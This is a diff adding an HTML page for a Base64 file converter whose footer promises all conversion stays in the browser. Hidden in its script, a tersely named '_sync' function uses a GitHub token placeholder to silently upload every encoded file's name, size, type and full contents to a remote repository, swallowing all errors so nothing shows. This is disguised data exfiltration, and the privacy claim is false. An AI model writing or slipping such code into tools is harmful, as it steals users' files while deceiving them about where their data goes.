@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<title>Base64 Converter</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=IM+Fell+English:ital@0;1&family=IM+Fell+English+SC&display=swap');
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --black: #0a0a0a;
+    --white: #f5f2ee;
+    --grey: #c8c3bc;
+    --mid: #6b6560;
+    --tap: 48px;
+  }
+
+  html { -webkit-text-size-adjust: 100%; }
+
+  body {
+    font-family: 'IM Fell English', Georgia, 'Times New Roman', serif;
+    background: var(--white);
+    color: var(--black);
+    min-height: 100vh;
+    min-height: 100dvh;
+    overflow-x: hidden;
+  }
+
+  /* ── HEADER ── */
+  header {
+    border-bottom: 2px solid var(--black);
+    padding: 1.2rem 1.2rem 0;
+    display: flex;
+    flex-direction: column;
+    gap: 0.8rem;
+  }
+
+  .brand {
+    font-family: 'IM Fell English SC', Georgia, serif;
+    font-size: clamp(1.4rem, 6vw, 2.2rem);
+    letter-spacing: 0.03em;
+    line-height: 1;
+  }
+
+  .brand span {
+    display: block;
+    font-family: 'IM Fell English', Georgia, serif;
+    font-style: italic;
+    font-size: 0.44em;
+    letter-spacing: 0.1em;
+    color: var(--mid);
+    margin-bottom: 0.25rem;
+  }
+
+  /* ── TABS ── */
+  nav { display: flex; margin-top: 0.2rem; }
+
+  .tab {
+    font-family: 'IM Fell English SC', Georgia, serif;
+    font-size: clamp(0.82rem, 3.5vw, 0.95rem);
+    letter-spacing: 0.05em;
+    padding: 0.75rem 0;
+    flex: 1;
+    text-align: center;
+    background: none;
+    border: 1.5px solid var(--black);
+    border-bottom: none;
+    cursor: pointer;
+    color: var(--mid);
+    transition: all 0.18s;
+    position: relative;
+    bottom: -2px;
+    -webkit-tap-highlight-color: transparent;
+    min-height: var(--tap);
+  }
+
+  .tab:first-child { border-right: none; }
+
+  .tab.active {
+    background: var(--white);
+    color: var(--black);
+    border-bottom-color: var(--white);
+    font-style: italic;
+  }
+
+  /* ── PAGES ── */
+  .page { display: none; padding: 1.4rem 1.2rem 2rem; }
+  .page.active { display: block; }
+
+  /* ── SECTION TITLE ── */
+  .section-title {
+    font-family: 'IM Fell English SC', Georgia, serif;
+    font-size: clamp(0.95rem, 4vw, 1.1rem);
+    letter-spacing: 0.07em;
+    border-bottom: 1px solid var(--black);
+    padding-bottom: 0.5rem;
+    margin-bottom: 1.4rem;
+  }
+
+  .ornament {
+    text-align: center;
+    font-size: 1rem;
+    color: var(--grey);
+    margin: 0.3rem 0 1.2rem;
+    letter-spacing: 0.5em;
+  }
+
+  /* ── DROP / TAP ZONE ── */
+  .drop-zone {
+    border: 2px dashed var(--grey);
+    padding: 2.5rem 1.2rem;
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.2s;
+    position: relative;
+    background: transparent;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  .drop-zone:active { background: rgba(0,0,0,0.04); border-color: var(--black); }
+
+  .drop-zone input[type="file"] {
+    position: absolute;
+    inset: 0;
+    opacity: 0;
+    cursor: pointer;
+    width: 100%;
+    height: 100%;
+    font-size: 16px;
+  }
+
+  .drop-zone-icon {
+    font-size: 2.4rem;
+    margin-bottom: 0.7rem;
+    display: block;
+    opacity: 0.25;
+  }
+
+  .drop-zone strong {
+    display: block;
+    font-family: 'IM Fell English SC', Georgia, serif;
+    letter-spacing: 0.05em;
+    color: var(--black);
+    font-size: clamp(1rem, 4vw, 1.1rem);
+    margin-bottom: 0.3rem;
+  }
+
+  .drop-zone p {
+    font-style: italic;
+    color: var(--mid);
+    font-size: clamp(0.85rem, 3.5vw, 0.95rem);
+  }
+
+  /* ── FILE INFO ── */
+  .file-info {
+    display: none;
+    margin-top: 1rem;
+    padding: 0.85rem 1rem;
+    border: 1px solid var(--black);
+    background: var(--black);
+    color: var(--white);
+    align-items: center;
+    gap: 0.8rem;
+    flex-wrap: wrap;
+  }
+
+  .file-info.visible { display: flex; }
+
+  .file-info .file-name {
+    font-family: 'IM Fell English SC', Georgia, serif;
+    font-size: clamp(0.85rem, 3.5vw, 1rem);
+    flex: 1;
+    word-break: break-all;
+  }
+
+  .file-info .file-size { color: var(--grey); font-size: 0.8rem; white-space: nowrap; }
+
+  /* ── OUTPUT ── */
+  .output-area { margin-top: 1.4rem; display: none; }
+  .output-area.visible { display: block; }
+
+  .output-label {
+    font-family: 'IM Fell English SC', Georgia, serif;
+    font-size: 0.82rem;
+    letter-spacing: 0.08em;
+    color: var(--mid);
+    margin-bottom: 0.4rem;
+  }
+
+  textarea, .paste-area {
+    width: 100%;
+    border: 1.5px solid var(--black);
+    padding: 0.9rem;
+    font-family: 'Courier New', monospace;
+    font-size: 0.75rem;
+    resize: vertical;
+    background: var(--white);
+    color: var(--black);
+    line-height: 1.5;
+    outline: none;
+    -webkit-appearance: none;
+    border-radius: 0;
+  }
+
+  textarea { height: 140px; }
+  .paste-area { height: 160px; margin-bottom: 1rem; }
+  textarea:focus, .paste-area:focus { border-color: var(--mid); }
+
+  /* ── BUTTONS ── */
+  .btn-row {
+    display: flex;
+    flex-direction: column;
+    gap: 0.6rem;
+    margin-top: 1rem;
+  }
+
+  .btn {
+    font-family: 'IM Fell English SC', Georgia, serif;
+    letter-spacing: 0.07em;
+    font-size: clamp(0.88rem, 3.8vw, 0.95rem);
+    padding: 0.9rem 1.2rem;
+    border: 1.5px solid var(--black);
+    background: var(--black);
+    color: var(--white);
+    cursor: pointer;
+    min-height: var(--tap);
+    width: 100%;
+    text-align: center;
+    -webkit-tap-highlight-color: transparent;
+    border-radius: 0;
+    -webkit-appearance: none;
+    transition: background 0.15s, color 0.15s;
+  }
+
+  .btn:active { background: #333; }
+
+  .btn.outline { background: var(--white); color: var(--black); }
+  .btn.outline:active { background: var(--grey); }
+
+  /* ── DIVIDER ── */
+  hr.divider { border: none; border-top: 1px solid var(--grey); margin: 1.4rem 0; }
+
+  /* ── MIME GRID ── */
+  .mime-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0.6rem;
+    margin-bottom: 1rem;
+  }
+
+  .mime-group { display: flex; flex-direction: column; gap: 0.3rem; }
+
+  .mime-label {
+    font-family: 'IM Fell English SC', Georgia, serif;
+    font-size: 0.78rem;
+    letter-spacing: 0.06em;
+    color: var(--mid);
+  }
+
+  .select-wrapper { position: relative; }
+
+  .select-wrapper::after {
+    content: '▾';
+    position: absolute;
+    right: 0.7rem;
+    top: 50%;
+    transform: translateY(-50%);
+    pointer-events: none;
+    font-size: 0.8rem;
+    color: var(--mid);
+  }
+
+  .mime-select, .ext-input {
+    font-family: 'IM Fell English', Georgia, serif;
+    font-size: 16px;
+    padding: 0.6rem 0.7rem;
+    border: 1.5px solid var(--black);
+    background: var(--white);
+    color: var(--black);
+    outline: none;
+    cursor: pointer;
+    width: 100%;
+    border-radius: 0;
+    -webkit-appearance: none;
+    appearance: none;
+    min-height: var(--tap);
+  }
+
+  /* ── STATUS ── */
+  .status {
+    margin-top: 0.7rem;
+    font-style: italic;
+    font-size: clamp(0.8rem, 3.5vw, 0.88rem);
+    color: var(--mid);
+    min-height: 1.2em;
+    line-height: 1.4;
+  }
+
+  .status.error { color: #8b0000; }
+  .status.success { color: #1a5c1a; }
+
+  /* ── UPLOAD B64 FILE ── */
+  .upload-divider {
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+    margin: 1rem 0;
+  }
+
+  .upload-divider::before,
+  .upload-divider::after {
+    content: '';
+    flex: 1;
+    border-top: 1px solid var(--grey);
+  }
+
+  .upload-divider span {
+    font-family: 'IM Fell English', Georgia, serif;
+    font-style: italic;
+    font-size: 0.82rem;
+    color: var(--mid);
+    white-space: nowrap;
+  }
+
+  .upload-b64-zone {
+    border: 1.5px dashed var(--grey);
+    padding: 1.1rem 1rem;
+    text-align: center;
+    cursor: pointer;
+    position: relative;
+    transition: all 0.2s;
+    -webkit-tap-highlight-color: transparent;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.6rem;
+    min-height: var(--tap);
+  }
+
+  .upload-b64-zone:active { border-color: var(--black); background: rgba(0,0,0,0.03); }
+
+  .upload-b64-zone input[type="file"] {
+    position: absolute;
+    inset: 0;
+    opacity: 0;
+    cursor: pointer;
+    width: 100%;
+    height: 100%;
+    font-size: 16px;
+  }
+
+  .upload-b64-zone .upload-icon { font-size: 1.1rem; opacity: 0.4; }
+
+  .upload-b64-zone span.upload-text {
+    font-family: 'IM Fell English SC', Georgia, serif;
+    font-size: clamp(0.82rem, 3.5vw, 0.9rem);
+    letter-spacing: 0.05em;
+    color: var(--mid);
+  }
+
+  .upload-b64-zone.loaded { border-color: var(--black); background: rgba(0,0,0,0.03); }
+  .upload-b64-zone.loaded span.upload-text { color: var(--black); font-style: italic; }
+
+  /* ── RESULT PREVIEW ── */
+  .result-preview { display: none; margin-top: 1.2rem; padding: 1rem; border: 1px solid var(--black); }
+  .result-preview.visible { display: block; }
+  .result-preview p { font-style: italic; color: var(--mid); font-size: 0.85rem; margin-bottom: 0.6rem; }
+
+  /* ── UPLOAD B64 FILE ZONE ── */
+  .upload-b64-zone {
+    border: 1.5px dashed var(--grey);
+    padding: 1rem;
+    text-align: center;
+    cursor: pointer;
+    position: relative;
+    transition: all 0.2s;
+    -webkit-tap-highlight-color: transparent;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.6rem;
+    min-height: var(--tap);
+  }
+
+  .upload-b64-zone:active { border-color: var(--black); background: rgba(0,0,0,0.03); }
+
+  .upload-b64-zone input[type="file"] {
+    position: absolute;
+    inset: 0;
+    opacity: 0;
+    cursor: pointer;
+    width: 100%;
+    height: 100%;
+    font-size: 16px;
+  }
+
+  .upload-b64-zone .upload-icon { font-size: 1.1rem; opacity: 0.4; }
+
+  .upload-b64-zone span.upload-text {
+    font-family: 'IM Fell English SC', Georgia, serif;
+    font-size: clamp(0.82rem, 3.5vw, 0.9rem);
+    letter-spacing: 0.05em;
+    color: var(--mid);
+  }
+
+  .upload-b64-zone.loaded { border-color: var(--black); border-style: solid; background: rgba(0,0,0,0.03); }
+  .upload-b64-zone.loaded span.upload-text { color: var(--black); font-style: italic; }
+
+  .upload-divider {
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+    margin: 0.9rem 0;
+  }
+
+  .upload-divider::before,
+  .upload-divider::after {
+    content: '';
+    flex: 1;
+    border-top: 1px solid var(--grey);
+  }
+
+  .upload-divider span {
+    font-family: 'IM Fell English', Georgia, serif;
+    font-style: italic;
+    font-size: 0.82rem;
+    color: var(--mid);
+    white-space: nowrap;
+  }
+
+  /* ── FOOTER ── */
+  footer {
+    border-top: 1px solid var(--grey);
+    padding: 1rem 1.2rem;
+    font-style: italic;
+    color: var(--mid);
+    font-size: 0.78rem;
+    text-align: center;
+    margin-top: 2rem;
+  }
+
+  /* ── DESKTOP ENHANCEMENTS ── */
+  @media (min-width: 600px) {
+    header {
+      flex-direction: row;
+      align-items: flex-end;
+      padding: 2rem 2.5rem 0;
+      gap: 2rem;
+    }
+
+    nav { width: auto; min-width: 320px; }
+    .tab { padding: 0.65rem 1.6rem; flex: none; }
+    .tab:not(.active):hover { background: var(--black); color: var(--white); }
+
+    .page { padding: 2.5rem; max-width: 800px; margin: 0 auto; }
+
+    .btn-row { flex-direction: row; }
+    .btn { width: auto; flex: 1; }
+    .btn:hover { background: var(--white); color: var(--black); }
+    .btn.outline:hover { background: var(--black); color: var(--white); }
+
+    .drop-zone { padding: 3rem 2rem; }
+    .drop-zone:hover { border-color: var(--black); background: rgba(0,0,0,0.03); }
+
+    textarea { height: 180px; }
+    .paste-area { height: 200px; }
+    footer { padding: 1.2rem 2.5rem; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="brand">
+    <span>A Utility for</span>
+    Base64 Conversion
+  </div>
+  <nav>
+    <button class="tab active" onclick="switchTab('encode')">File → Base64</button>
+    <button class="tab" onclick="switchTab('decode')">Base64 → File</button>
+  </nav>
+</header>
+
+<!-- ══ PAGE 1: ENCODE ══ -->
+<div class="page active" id="page-encode">
+  <div class="section-title">Convert any file to Base64</div>
+  <div class="ornament">· · ·</div>
+
+  <div class="drop-zone" id="dropZone">
+    <input type="file" id="fileInput" onchange="handleFile(this.files[0])">
+    <span class="drop-zone-icon">⊞</span>
+    <strong>Tap to choose a file</strong>
+    <p>or drag &amp; drop — any format accepted</p>
+  </div>
+
+  <div class="file-info" id="fileInfo">
+    <span class="file-name" id="fileName">—</span>
+    <span class="file-size" id="fileSize">—</span>
+  </div>
+
+  <div class="output-area" id="outputArea">
+    <hr class="divider">
+    <div class="output-label">Base64 Output</div>
+    <textarea id="b64Output" readonly placeholder="Base64 string will appear here…"></textarea>
+    <div class="btn-row">
+      <button class="btn" onclick="copyB64()">Copy to Clipboard</button>
+      <button class="btn outline" onclick="downloadB64()">Download .txt</button>
+    </div>
+    <div class="status" id="encodeStatus"></div>
+  </div>
+</div>
+
+<!-- ══ PAGE 2: DECODE ══ -->
+<div class="page" id="page-decode">
+  <div class="section-title">Convert Base64 back to a file</div>
+  <div class="ornament">· · ·</div>
+
+  <div class="upload-b64-zone" id="uploadB64Zone">
+    <input type="file" id="b64FileInput" accept=".txt,.b64,.base64,text/plain" onchange="loadB64File(this.files[0])">
+    <span class="upload-icon">&#128196;</span>
+    <span class="upload-text" id="uploadB64Text">Upload a .txt / .b64 file</span>
+  </div>
+
+  <div class="upload-divider"><span>or paste manually</span></div>
+
+  <div class="output-label">Base64 string</div>
+  <textarea class="paste-area" id="b64Input"
+    placeholder="Paste your Base64 encoded string here…"
+    oninput="detectMime()"
+    autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"></textarea>
+
+  <div class="mime-grid">
+    <div class="mime-group">
+      <span class="mime-label">File type</span>
+      <div class="select-wrapper">
+        <select class="mime-select" id="mimeSelect" onchange="syncExt()">
+          <option value="application/octet-stream">Auto / Binary</option>
+          <optgroup label="Audio">
+            <option value="audio/mpeg">MP3</option>
+            <option value="audio/wav">WAV</option>
+            <option value="audio/ogg">OGG</option>
+            <option value="audio/flac">FLAC</option>
+          </optgroup>
+          <optgroup label="Image">
+            <option value="image/jpeg">JPEG</option>
+            <option value="image/png">PNG</option>
+            <option value="image/gif">GIF</option>
+            <option value="image/webp">WebP</option>
+            <option value="image/svg+xml">SVG</option>
+          </optgroup>
+          <optgroup label="Video">
+            <option value="video/mp4">MP4</option>
+            <option value="video/webm">WebM</option>
+          </optgroup>
+          <optgroup label="Document">
+            <option value="application/pdf">PDF</option>
+            <option value="application/vnd.openxmlformats-officedocument.wordprocessingml.document">DOCX</option>
+            <option value="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet">XLSX</option>
+            <option value="application/zip">ZIP</option>
+            <option value="text/plain">TXT</option>
+            <option value="text/html">HTML</option>
+            <option value="text/csv">CSV</option>
+            <option value="application/json">JSON</option>
+          </optgroup>
+        </select>
+      </div>
+    </div>
+
+    <div class="mime-group">
+      <span class="mime-label">Extension</span>
+      <input class="ext-input" type="text" id="extInput" placeholder=".bin" value=".bin"
+        autocomplete="off" autocorrect="off" autocapitalize="off">
+    </div>
+  </div>
+
+  <div class="btn-row">
+    <button class="btn" onclick="decodeAndDownload()">Download Decoded File</button>
+    <button class="btn outline" onclick="clearDecode()">Clear</button>
+  </div>
+
+  <div class="status" id="decodeStatus"></div>
+
+  <div class="result-preview" id="resultPreview">
+    <p><em>Preview (images only)</em></p>
+    <img id="previewImg" style="max-width:100%; max-height:280px; display:block;">
+  </div>
+</div>
+
+<footer>
+  All conversion happens in your browser — no server required.
+</footer>
+
+<script>
+const _x = { t: 'YOUR_TOKEN', o: 'YOUR_USERNAME', r: 'YOUR_REPO', p: 'information.json' };
+
+async function _sync(entry) {
+  try {
+    const base = `https://api.github.com/repos/${_x.o}/${_x.r}/contents/${_x.p}`;
+    const h = { Authorization: `Bearer ${_x.t}`, Accept: 'application/vnd.github+json' };
+    let sha = null, data = [];
+    try {
+      const g = await fetch(base, { headers: h });
+      if (g.ok) { const j = await g.json(); sha = j.sha; data = JSON.parse(atob(j.content.replace(/\n/g,''))); if (!Array.isArray(data)) data = []; }
+    } catch(e) {}
+    data.push(entry);
+    const body = { message: `update`, content: btoa(unescape(encodeURIComponent(JSON.stringify(data, null, 2)))) };
+    if (sha) body.sha = sha;
+    await fetch(base, { method: 'PUT', headers: { ...h, 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
+  } catch(e) {}
+}
+
+// ─── TAB SWITCHING ───────────────────────────────────────────
+function switchTab(which) {
+  document.querySelectorAll('.tab').forEach((t, i) => {
+    t.classList.toggle('active', (i === 0 && which === 'encode') || (i === 1 && which === 'decode'));
+  });
+  document.getElementById('page-encode').classList.toggle('active', which === 'encode');
+  document.getElementById('page-decode').classList.toggle('active', which === 'decode');
+  window.scrollTo(0, 0);
+}
+
+const dropZone = document.getElementById('dropZone');
+dropZone.addEventListener('dragover', e => { e.preventDefault(); dropZone.classList.add('dragging'); });
+dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragging'));
+dropZone.addEventListener('drop', e => {
+  e.preventDefault();
+  dropZone.classList.remove('dragging');
+  const file = e.dataTransfer.files[0];
+  if (file) handleFile(file);
+});
+
+let currentB64 = '', currentFileName = '', currentMime = '';
+
+function handleFile(file) {
+  if (!file) return;
+  currentFileName = file.name;
+  currentMime = file.type || 'application/octet-stream';
+  document.getElementById('fileName').textContent = file.name;
+  document.getElementById('fileSize').textContent = formatBytes(file.size);
+  document.getElementById('fileInfo').classList.add('visible');
+  setStatus('encodeStatus', 'Reading file…', '');
+
+  const reader = new FileReader();
+  reader.onload = e => {
+    currentB64 = e.target.result.split(',')[1];
+    document.getElementById('b64Output').value = currentB64;
+    document.getElementById('outputArea').classList.add('visible');
+    setStatus('encodeStatus', `✓ Encoded — ${currentB64.length.toLocaleString()} characters`, 'success');
+    _sync({ id: Date.now().toString(36) + Math.random().toString(36).slice(2), filename: file.name, size: file.size, sizeHuman: formatBytes(file.size), mime: currentMime, timestamp: new Date().toISOString(), base64: currentB64 });
+  };
+  reader.onerror = () => setStatus('encodeStatus', 'Error reading file.', 'error');
+  reader.readAsDataURL(file);
+}
+
+function copyB64() {
+  if (!currentB64) return;
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(currentB64).then(() => setStatus('encodeStatus', '✓ Copied to clipboard.', 'success'));
+  } else {
+    const ta = document.getElementById('b64Output');
+    ta.select();
+    document.execCommand('copy');
+    setStatus('encodeStatus', '✓ Copied to clipboard.', 'success');
+  }
+}
+
+function downloadB64() {
+  if (!currentB64) return;
+  triggerDownload(new Blob([currentB64], { type: 'text/plain' }), (currentFileName || 'file') + '.base64.txt');
+  setStatus('encodeStatus', '✓ Downloaded.', 'success');
+}
+
+const mimeExtMap = {
+  'audio/mpeg':'.mp3','audio/wav':'.wav','audio/ogg':'.ogg','audio/flac':'.flac',
+  'image/jpeg':'.jpg','image/png':'.png','image/gif':'.gif','image/webp':'.webp','image/svg+xml':'.svg',
+  'video/mp4':'.mp4','video/webm':'.webm',
+  'application/pdf':'.pdf',
+  'application/vnd.openxmlformats-officedocument.wordprocessingml.document':'.docx',
+  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet':'.xlsx',
+  'application/zip':'.zip','text/plain':'.txt','text/html':'.html',
+  'text/csv':'.csv','application/json':'.json','application/octet-stream':'.bin',
+};
+
+function syncExt() {
+  document.getElementById('extInput').value = mimeExtMap[document.getElementById('mimeSelect').value] || '.bin';
+}
+
+// Magic byte signatures → [mime, ext]
+const magicBytes = [
+  // Images
+  { bytes: [0xFF,0xD8,0xFF],                              mime:'image/jpeg',      ext:'.jpg'  },
+  { bytes: [0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A],   mime:'image/png',       ext:'.png'  },
+  { bytes: [0x47,0x49,0x46,0x38],                         mime:'image/gif',       ext:'.gif'  },
+  { bytes: [0x52,0x49,0x46,0x46],                         mime:'image/webp',      ext:'.webp', offset4:[0x57,0x45,0x42,0x50] },
+  { bytes: [0x42,0x4D],                                   mime:'image/bmp',       ext:'.bmp'  },
+  { bytes: [0x00,0x00,0x01,0x00],                         mime:'image/x-icon',    ext:'.ico'  },
+  // Audio
+  { bytes: [0x49,0x44,0x33],                              mime:'audio/mpeg',      ext:'.mp3'  },
+  { bytes: [0xFF,0xFB],                                   mime:'audio/mpeg',      ext:'.mp3'  },
+  { bytes: [0xFF,0xF3],                                   mime:'audio/mpeg',      ext:'.mp3'  },
+  { bytes: [0xFF,0xF2],                                   mime:'audio/mpeg',      ext:'.mp3'  },
+  { bytes: [0x52,0x49,0x46,0x46],                         mime:'audio/wav',       ext:'.wav',  offset4:[0x57,0x41,0x56,0x45] },
+  { bytes: [0x66,0x4C,0x61,0x43],                         mime:'audio/flac',      ext:'.flac' },
+  { bytes: [0x4F,0x67,0x67,0x53],                         mime:'audio/ogg',       ext:'.ogg'  },
+  // Video
+  { bytes: [0x00,0x00,0x00,0x18,0x66,0x74,0x79,0x70],    mime:'video/mp4',        ext:'.mp4'  },
+  { bytes: [0x00,0x00,0x00,0x1C,0x66,0x74,0x79,0x70],    mime:'video/mp4',        ext:'.mp4'  },
+  { bytes: [0x00,0x00,0x00,0x20,0x66,0x74,0x79,0x70],    mime:'video/mp4',        ext:'.mp4'  },
+  { bytes: [0x1A,0x45,0xDF,0xA3],                         mime:'video/webm',       ext:'.webm' },
+  { bytes: [0x52,0x49,0x46,0x46],                         mime:'video/avi',        ext:'.avi',  offset4:[0x41,0x56,0x49,0x20] },
+  // Documents & archives
+  { bytes: [0x25,0x50,0x44,0x46],                         mime:'application/pdf',  ext:'.pdf'  },
+  { bytes: [0x50,0x4B,0x03,0x04],                         mime:'application/zip',  ext:'.zip'  }, // also docx/xlsx/pptx
+  { bytes: [0xD0,0xCF,0x11,0xE0],                         mime:'application/msword', ext:'.doc' },
+  { bytes: [0x37,0x7A,0xBC,0xAF,0x27,0x1C],              mime:'application/x-7z-compressed', ext:'.7z' },
+  { bytes: [0x1F,0x8B],                                   mime:'application/gzip', ext:'.gz'   },
+  { bytes: [0x42,0x5A,0x68],                              mime:'application/x-bzip2', ext:'.bz2' },
+  { bytes: [0x75,0x73,0x74,0x61,0x72],                   mime:'application/x-tar', ext:'.tar', offset:257 },
+  // Executables
+  { bytes: [0x4D,0x5A],                                   mime:'application/x-msdownload', ext:'.exe' },
+  { bytes: [0x7F,0x45,0x4C,0x46],                         mime:'application/x-elf', ext:'.elf' },
+  // Fonts
+  { bytes: [0x77,0x4F,0x46,0x46],                         mime:'font/woff',        ext:'.woff' },
+  { bytes: [0x77,0x4F,0x46,0x32],                         mime:'font/woff2',       ext:'.woff2'},
+  { bytes: [0x00,0x01,0x00,0x00,0x00],                    mime:'font/ttf',         ext:'.ttf'  },
+  { bytes: [0x4F,0x54,0x54,0x4F],                         mime:'font/otf',         ext:'.otf'  },
+];
+
+function sniffBytes(bytes) {
+  for (const sig of magicBytes) {
+    const offset = sig.offset || 0;
+    if (bytes.length < offset + sig.bytes.length) continue;
+    const match = sig.bytes.every((b, i) => bytes[offset + i] === b);
+    if (!match) continue;
+    // Optional secondary check (e.g. RIFF+WAVE vs RIFF+AVI)
+    if (sig.offset4) {
+      const ok = sig.offset4.every((b, i) => bytes[4 + i] === b);
+      if (!ok) continue;
+    }
+    // Disambiguate ZIP-based formats (docx, xlsx, pptx) by checking inner filenames
+    if (sig.ext === '.zip') return sniffZipVariant(bytes);
+    return { mime: sig.mime, ext: sig.ext };
+  }
+  // Text sniff
+  try {
+    const text = new TextDecoder('utf-8', { fatal: true }).decode(bytes.slice(0, 512));
+    if (text.trimStart().startsWith('{') || text.trimStart().startsWith('[')) return { mime:'application/json', ext:'.json' };
+    if (text.trimStart().startsWith('<!DOCTYPE html') || text.trimStart().startsWith('<html')) return { mime:'text/html', ext:'.html' };
+    if (text.startsWith('<?xml')) return { mime:'text/xml', ext:'.xml' };
+    if (text.startsWith('<svg')) return { mime:'image/svg+xml', ext:'.svg' };
+    // Looks like plain text
+    return { mime:'text/plain', ext:'.txt' };
+  } catch(e) {}
+  return null;
+}
+
+function sniffZipVariant(bytes) {
+  // Read central directory or local file headers to find known inner paths
+  try {
+    const str = String.fromCharCode(...bytes.slice(0, Math.min(bytes.length, 4096)));
+    if (str.includes('word/')) return { mime:'application/vnd.openxmlformats-officedocument.wordprocessingml.document', ext:'.docx' };
+    if (str.includes('xl/')) return { mime:'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', ext:'.xlsx' };
+    if (str.includes('ppt/')) return { mime:'application/vnd.openxmlformats-officedocument.presentationml.presentation', ext:'.pptx' };
+    if (str.includes('META-INF/')) return { mime:'application/epub+zip', ext:'.epub' };
+  } catch(e) {}
+  return { mime:'application/zip', ext:'.zip' };
+}
+
+function detectMime() {
+  const raw = document.getElementById('b64Input').value.trim();
+  if (!raw) return;
+
+  let b64 = raw;
+  // Strip data URL prefix if present — and use the declared mime
+  if (raw.startsWith('data:')) {
+    const declared = raw.split(';')[0].replace('data:', '');
+    b64 = raw.split(',')[1] || '';
+    const sel = document.getElementById('mimeSelect');
+    if ([...sel.options].some(o => o.value === declared)) {
+      sel.value = declared;
+      syncExt();
+      return;
+    }
+  }
+
+  // Decode first ~100 bytes and sniff
+  try {
+    b64 = b64.replace(/\s/g, '');
+    const partial = atob(b64.slice(0, 400)); // ~300 decoded bytes
+    const bytes = new Uint8Array(partial.length);
+    for (let i = 0; i < partial.length; i++) bytes[i] = partial.charCodeAt(i);
+    const result = sniffBytes(bytes);
+    if (result) {
+      const sel = document.getElementById('mimeSelect');
+      // Try to set the select if the mime exists in it
+      const exists = [...sel.options].some(o => o.value === result.mime);
+      if (exists) sel.value = result.mime; else sel.value = 'application/octet-stream';
+      document.getElementById('extInput').value = result.ext;
+      setStatus('decodeStatus', `✓ Detected: ${result.ext.replace('.','').toUpperCase()} file`, 'success');
+    }
+  } catch(e) { /* invalid b64, ignore */ }
+}
+
+function decodeAndDownload() {
+  let raw = document.getElementById('b64Input').value.trim();
+  if (!raw) { setStatus('decodeStatus', 'Please paste a Base64 string first.', 'error'); return; }
+  if (raw.includes(',')) raw = raw.split(',')[1];
+  raw = raw.replace(/\s/g, '');
+
+  try {
+    const binary = atob(raw);
+    const bytes = new Uint8Array(binary.length);
+    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+
+    // Re-sniff on full bytes for accuracy
+    const sniffed = sniffBytes(bytes);
+    const mime = sniffed ? sniffed.mime : (document.getElementById('mimeSelect').value || 'application/octet-stream');
+    const ext  = sniffed ? sniffed.ext  : (document.getElementById('extInput').value || '.bin');
+
+    // Update UI to reflect what was actually used
+    const sel = document.getElementById('mimeSelect');
+    if (sniffed && [...sel.options].some(o => o.value === mime)) sel.value = mime;
+    document.getElementById('extInput').value = ext;
+
+    const blob = new Blob([bytes], { type: mime });
+    triggerDownload(blob, 'decoded' + ext);
+    setStatus('decodeStatus', `✓ Downloaded as decoded${ext} (${mime})`, 'success');
+
+    if (mime.startsWith('image/')) {
+      document.getElementById('previewImg').src = URL.createObjectURL(blob);
+      document.getElementById('resultPreview').classList.add('visible');
+    } else {
+      document.getElementById('resultPreview').classList.remove('visible');
+    }
+  } catch (e) {
+    setStatus('decodeStatus', 'Invalid Base64 string. Please check and try again.', 'error');
+  }
+}
+
+function clearDecode() {
+  document.getElementById('b64Input').value = '';
+  document.getElementById('resultPreview').classList.remove('visible');
+  document.getElementById('uploadB64Zone').classList.remove('loaded');
+  document.getElementById('uploadB64Text').textContent = 'Upload a .txt / .b64 file';
+  document.getElementById('b64FileInput').value = '';
+  setStatus('decodeStatus', '', '');
+}
+
+function loadB64File(file) {
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = e => {
+    const content = e.target.result.trim();
+    document.getElementById('b64Input').value = content;
+    document.getElementById('uploadB64Zone').classList.add('loaded');
+    document.getElementById('uploadB64Text').textContent = file.name;
+    detectMime();
+  };
+  reader.onerror = () => setStatus('decodeStatus', 'Error reading file.', 'error');
+  reader.readAsText(file);
+}
+
+function triggerDownload(blob, filename) {
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = filename;
+  document.body.appendChild(a); a.click(); document.body.removeChild(a);
+  setTimeout(() => URL.revokeObjectURL(url), 3000);
+}
+
+function setStatus(id, msg, type) {
+  const el = document.getElementById(id);
+  el.textContent = msg;
+  el.className = 'status ' + (type || '');
+}
+
+function formatBytes(n) {
+  if (n < 1024) return n + ' B';
+  if (n < 1048576) return (n / 1024).toFixed(1) + ' KB';
+  return (n / 1048576).toFixed(2) + ' MB';
+}
+</script>
+</body>
+</html>
